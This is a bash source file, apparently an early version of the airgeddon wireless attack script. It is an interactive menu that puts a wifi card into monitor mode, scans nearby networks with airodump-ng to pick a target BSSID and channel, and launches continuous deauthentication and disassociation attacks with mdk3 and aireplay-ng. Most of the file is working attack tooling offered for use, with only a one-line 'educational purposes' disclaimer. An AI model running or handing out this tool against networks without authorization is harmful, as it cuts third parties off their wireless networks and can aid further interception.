#!/bin/bash

version="1.03"

function check_to_set_managed() {

	if [ "$distro" = "Kali" ]; then
	      nowifi=`iwconfig $interface 2> /dev/null`
	      if [[ "$?" != "0" ]]; then
		      echo
		      echo_yellow "This interface $interface is not a wifi card. It doesn't support managed mode"
		      read -p "Press [Enter] key to continue..."
		      return 1
	      fi
	else
	      nowifi=`iwconfig $interface 2> /dev/null|grep Mode:`
	      if [[ "$?" != "0" ]]; then
	      	      echo
		      echo_yellow "This interface $interface is not a wifi card. It doesn't support managed mode"
		      read -p "Press [Enter] key to continue..."
		      return 1
	      fi
	fi

	mode=`iwconfig $interface | grep Mode: | cut -d ':' -f 2|cut -d ' ' -f 1`

	if [[ $mode = "Managed" ]]; then
	      echo
	      echo_yellow "This interface $interface is already in managed mode"
	      read -p "Press [Enter] key to continue..."
	      return 1
	fi
	return 0
}

function check_to_set_monitor() {

	if [ "$distro" = "Kali" ]; then
	      nowifi=`iwconfig $interface 2> /dev/null`
	      if [[ "$?" != "0" ]]; then
		      echo
		      echo_yellow "This interface $interface is not a wifi card. It doesn't support monitor mode"
		      read -p "Press [Enter] key to continue..."
		      return 1
	      fi
	else
	      nowifi=`iwconfig $interface 2> /dev/null|grep Mode:`
	      if [[ "$?" != "0" ]]; then
	      	      echo
		      echo_yellow "This interface $interface is not a wifi card. It doesn't support monitor mode"
		      read -p "Press [Enter] key to continue..."
		      return 1
	      fi
	fi

	mode=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}'`

	if [[ $mode = "Mode:Monitor" ]]; then
	      echo
	      echo_yellow "This interface $interface is already in monitor mode"
	      read -p "Press [Enter] key to continue..."
	      return 1
	fi
	return 0
}

function check_monitor_enabled() {

	mode=`iwconfig $interface 2> /dev/null | grep Mode: | awk '{print $4}'`

	if [[ $mode != "Mode:Monitor" ]]; then
		echo
		echo_yellow "This interface $interface is not in monitor mode"
		read -p "Press [Enter] key to continue..."
		return 1
	fi
	return 0
}

function disable_rfkill() {

	rfkill unblock 0
	for i in {0..5}; do
	  rfkill unblock $i
	done
}

function managed_option() {

	check_to_set_managed

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	echo_blue "Putting your interface in managed mode..."
	ifconfig $interface up

	if [ "$distro" = "Kali" ]; then
		new_interface=$(airmon-ng stop $interface | grep station | cut -d ']' -f 2)
		new_interface=${new_interface:: -1}
	else
		new_interface=`airmon-ng stop mon0 | grep -v removed | grep -v Interface | awk '{print $1}'`
	fi

	if [ "$interface" != "$new_interface" ]; then
		echo
		echo_yellow "The interface changed its name while putting in managed mode"
		interface=$new_interface
	fi

	echo
	echo_yellow "Managed mode now is set on $interface"
	read -p "Press [Enter] key to continue..."
}

function monitor_option() {

	check_to_set_monitor
	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	echo_blue "Putting your interface in monitor mode..."
	echo_blue "Please be patient. Maybe killing some conflicting processes..."
	ifconfig $interface up
	iwconfig $interface rate 1M > /dev/null 2>&1

	if [ "$?" != "0" ]; then
		echo
		echo_yellow "This interface $interface doesn't support monitor mode"
		read -p "Press [Enter] key to continue..."
		return
	fi

	airmon-ng check kill > /dev/null 2>&1

	if [ "$distro" = "Kali" ]; then
		new_interface=$(airmon-ng start $interface | grep monitor | cut -d ']' -f 3)
	else
		new_interface=$(airmon-ng start $interface | grep monitor | awk '{print $5}')
	fi

	new_interface=${new_interface:: -1}

	if [ "$interface" != "$new_interface" ]; then
		echo
		echo_yellow "The interface changed its name while putting in monitor mode"
		interface=$new_interface
	fi

	echo
	echo_yellow "Monitor mode now is set on $interface"
	read -p "Press [Enter] key to continue..."
}

function select_interface() {

	clear
	echo_red "*****************************Interface selection********************************"
	echo_green "Select an interface to work with :"
        echo
	ifaces=`ifconfig -a|grep HWaddr|cut -d ' ' -f 1`
	option_counter=0
	for item in $ifaces
	do
		option_counter=$[option_counter + 1]
	        echo "$option_counter. $item"
	done
	read iface
	if [ -z $iface ]; then
		invalid_iface_selected
		else if [[ $iface < 1 ]] || [[ $iface > $option_counter ]]; then
			invalid_iface_selected
		else
			option_counter2=0
			for item2 in $ifaces
			do
				option_counter2=$[option_counter2 + 1]
				if [[ "$iface" = "$option_counter2" ]]; then
					interface=$item2
					break;
				fi
			done
		fi
	fi
}

function read_channel() {

	echo
	echo_green "Set channel (1-14) :"
	read channel
}

function ask_channel() {

	while [[ ! ${channel} =~ ^([1-9]|1[0-4])$ ]]; do
			read_channel
		done
		echo
		echo_yellow "Channel set to ${channel}"
}

function read_bssid() {

	echo
	echo_green "Type target BSSID (example: 00:11:22:33:44:55) :"
	read bssid
}

function ask_bssid() {

	while [[ ! ${bssid} =~ ^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; do
		read_bssid
	done
	echo
	echo_yellow "BSSID set to ${bssid}"
}

function exec_mdk3deauth() {

	echo
	echo_red "*********************************Mdk3 action************************************"
	echo_green "All parameters set"

	rm /tmp/bl.txt > /dev/null 2>&1
	echo $bssid > /tmp/bl.txt

	echo
	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
	read -p "Press [Enter] key to start attack..."
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "mdk3 attack" -e mdk3 $interface d -b /tmp/bl.txt -c $channel
}

function exec_aireplaydeauth() {

	echo
	echo_red "*******************************Aireplay action**********************************"
	echo_green "All parameters set"

	airmon-ng start $interface $channel > /dev/null 2>&1

	echo
	echo_blue "Starting attack. When started, press Ctrl+C to stop..."
	read -p "Press [Enter] key to start attack..."
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "aireplay attack" -e aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $interface
}

function mdk3_deauth_option() {

	echo
	echo_red "*******************************Mdk3 parameters**********************************"
	echo_green "Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"

	ask_bssid
	ask_channel
	exec_mdk3deauth
}

function aireplay_deauth_option() {

	echo
	echo_red "*****************************Aireplay parameters********************************"
	echo_green "Deauthentication aireplay attack chosen (monitor mode needed)"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	echo_yellow "Selected interface $interface is in monitor mode. Attack can be performed"

	ask_bssid
	ask_channel
	exec_aireplaydeauth
}

function print_selections() {

	echo_blue "Interface $interface selected"
	if [ -n "$bssid" ]; then
		echo_blue "Selected BSSID: $bssid"
		if [ -n "$channel" ]; then
			echo_blue "Selected Channel: $channel"
		fi
		if [ -n "$essid" ]; then
			if [ "$essid" = "(Hidden Network)" ]; then
				echo_blue "Selected ESSID: $essid <- can't be used"
			else
				echo_blue "Selected ESSID: $essid"
			fi
		fi

	fi
}

function menu_options() {

	clear
	echo_red "*****************************airgeddon script menu********************************"
	print_selections
	echo
	echo_green "Select your option from menu :"
    echo "---------"
	echo "1. Select another network interface"
	echo "2. Explore neighbourhood (info window) for targets (monitor mode needed)"
	echo "---------"
    echo "3. Deauthentication / Disassociation mdk3 attack (monitor mode needed)"
    echo "4. Deauthentication aireplay attack (monitor mode needed)"
	echo "---------"
	echo "5. Put interface in monitor mode"
	echo "6. Put interface in managed mode"
	echo "---------"
	echo "7. Credits & About"
    echo "8. Exit script"
	read option

	if [ -z $option ]; then
		invalid_menu_option

		else if [ $option -eq 1 ]; then
			select_interface

			else if [ $option -eq 2 ]; then

				explore_neighbourhood_option
				else if [ $option -eq 3 ]; then
					mdk3_deauth_option

					else if [ $option -eq 4 ]; then
					aireplay_deauth_option

						else if [ $option -eq 5 ]; then
							monitor_option

							else if [ $option -eq 6 ]; then
								managed_option

								else if [ $option -eq 7 ]; then
									credits_option

									else if [ $option -eq 8 ]; then
										exit_script_option
									else
										invalid_menu_option
									fi
								fi
							fi
						fi
					fi
				fi
			fi
		fi
	fi

	menu_options
}

function explore_neighbourhood_option() {

	echo
	echo_red "***************************Exploring Neighbourhood******************************"
	echo_green "Exploring Neighbourhood option chosen (monitor mode needed)"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	echo_yellow "Selected interface $interface is in monitor mode. Exploration can be performed"
	echo
	echo_blue "When started, press Ctrl+C to stop..."

	read -p "Press [Enter] key to continue..."
	rm /tmp/nws* > /dev/null 2>&1
	rm /tmp/clts.csv > /dev/null 2>&1
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "Exploring neighbourhood" -e airodump-ng -w /tmp/nws $interface
	targetline=`cat /tmp/nws-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	targetline=`expr $targetline - 1`

	head -n $targetline /tmp/nws-01.csv &> /tmp/nws.csv
	tail -n +$targetline /tmp/nws-01.csv &> /tmp/clts.csv
	#clear
	csvline=`wc -l /tmp/nws.csv | awk '{print $1}'`
	if [ $csvline -le 3 ]; then
		echo
		echo_yellow "No networks found"
		read -p "Press [Enter] key to continue..."
		return
	fi

	rm  /tmp/nws.txt > /dev/null 2>&1
	rm  /tmp/wnws.txt > /dev/null 2>&1
	i=0
	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do

		chars_mac=${#MAC}
		if [ $chars_mac -ge 17 ]; then
			i=$(($i+1))
			if [[ $POWER -lt 0 ]]; then
				if [[ $POWER -eq -1 ]]; then
					POWER=0
				else
					POWER=`expr $POWER + 100`
				fi
			fi

			POWER=`echo $POWER | awk '{gsub(/ /,""); print}'`
			ESSID=`expr substr "$ESSID" 2 $IDLENGTH`
			if [ $CHANNEL -gt 14 ] || [ $CHANNEL -lt 1 ]; then
				CHANNEL=0
			else
				CHANNEL=`echo $CHANNEL | awk '{gsub(/ /,""); print}'`
			fi

			if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ]; then
				ESSID="(Hidden Network)"
			fi
			echo -e "$MAC,$CHANNEL,$POWER,$ESSID" >> /tmp/nws.txt
		fi
	done < /tmp/nws.csv
	sort -t "," -d -k 4 "/tmp/nws.txt" > "/tmp/wnws.txt"
	select_target
}

function select_target() {

	clear
	echo_red "*******************************Select target************************************"
	echo "  N.         BSSID      CHANNEL  PWR       ESSID"
	echo_blue "-------------------------------------------------------"
	i=0
	while IFS=, read MAC CHANNEL POWER ESSID; do

		i=$(($i+1))

		if [ $i -le 9 ]; then
			SPACE1=" "
		else
			SPACE1=""
		fi

		if [[ $CHANNEL -le 9 ]]; then
			SPACE2=" "
			if [[ $CHANNEL -eq 0 ]]; then
				CHANNEL="-"
			fi
		else
			SPACE2=""
		fi

		if [[ "$POWER" = "" ]]; then
			POWER=0
		fi

		if [[ $POWER -le 9 ]]; then
			SPACE4=" "
		else
			SPACE4=""
		fi

		CLIENT=`cat /tmp/clts.csv | grep $MAC`
		if [ "$CLIENT" != "" ]; then
			CLIENT="*"
			SPACE5=""
		else
			SPACE5=" "
		fi

		network_names[$i]=$ESSID
		channels[$i]=$CHANNEL
		macs[$i]=$MAC
		echo -e " $SPACE1$i)$CLIENT  $SPACE5$MAC   $SPACE2$CHANNEL    $SPACE4$POWER%   $ESSID"
	done < "/tmp/wnws.txt"
	echo
	if [ $i -eq 1 ]; then
		echo_yellow "Only one target detected. Autoselected"
		select=1
		read -p "Press [Enter] key to continue..."
	else
		echo "(*) Network with clients"
		echo_blue "-------------------------------------------------------"
		echo
		read -p "Select target network : " select
	fi

	while [[ $select -lt 1 ]] || [[ $select -gt $i ]]; do
		echo
		echo_yellow "Invalid target network was chosen"
		echo
		read -p "Select target network : " select
	done

	essid=${network_names[$select]}
	channel=${channels[$select]}
	bssid=${macs[$select]}
}

function credits_option() {

	clear
	echo_red "******************************Credits & About***********************************"
	echo_blue "airgeddon script v$version developed by :"
	echo "       ____        ____  __   _______"
	echo "___  _/_   | _____/_   |/  |_ \   _  \_______"
	echo "\  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \ "
	echo " \   / |   |\___ \ |   ||  |  \  \_/   \  | \/"
	echo "  \_/  |___/____  >|___||__|   \_____  /__|"
	echo "                \/                   \/"
	echo "		      .-\"\"\"\"-."
	echo "		     /        \ "
	echo "		    /_        _\ "
	echo "		   // \      / \\\ "
	echo "		   |\__\    /__/|"
	echo "		    \    ||    /"
	echo "		     \        /"
	echo "		      \  __  / "
	echo "		       '.__.'"
	echo "		        |  |"
	echo
	echo_blue "This script is under GPLv2 (or later) License."
	echo_blue "Thanks to the \"Spanish pen testing crew\" for beta testing and support received."
	read -p "Press [Enter] key to continue..."
}

function invalid_menu_option() {

	echo
	echo_yellow "Invalid menu option was chosen"
	read -p "Press [Enter] key to continue..."
}

function invalid_iface_selected() {

	echo
	echo_yellow "Invalid interface was chosen"
	echo
	read -p "Press [Enter] key to continue..."
	echo
	select_interface
}

function exit_script_option() {

	echo
	echo_red "************************************Exit****************************************"
	echo_blue "Exiting airgeddon script - 2016 - See you soon! :)"
	echo
	exit
}

function detect_distro() {

	uname -a | grep kali > /dev/null
	if [ "$?" = "0" ]; then
		echo_yellow "Kali Linux distro detected. Script can continue..."
		distro="Kali"
		echo
		return
	fi

	uname -a | grep wifislax > /dev/null
	if [ "$?" = "0" ]; then
		echo_yellow "Wifislax Linux distro detected. Script can continue..."
		distro="Wifislax"
		echo
		return
	fi

	echo_yellow "No compatible distro detected"
	exit_script_option
}

function welcome() {

	clear
	echo_red "***********************************Welcome**************************************"
	echo_blue "Welcome to airgeddon script"
	echo
	echo_green "This script is only for educational purposes. Be good boyz&girlz"
	echo
	echo_blue "This script is only working on Kali Linux and Wifislax"
	echo_blue "Detecting distro..."
	echo

	detect_distro
	read -p "Press [Enter] key to continue..."
	select_interface
	menu_options
}

function echo_green() {

	tput setaf 2; tput setab 0;
	echo $*
	tput sgr0
}

function echo_blue() {

	tput setaf 4; tput setab 0;
	echo $*
	tput sgr0
}

function echo_yellow() {

	tput setaf 3; tput setab 0;
	echo $*
	tput sgr0
}

function echo_red() {
	tput setaf 1; tput setab 0;
	echo $*
	tput sgr0
}

welcome
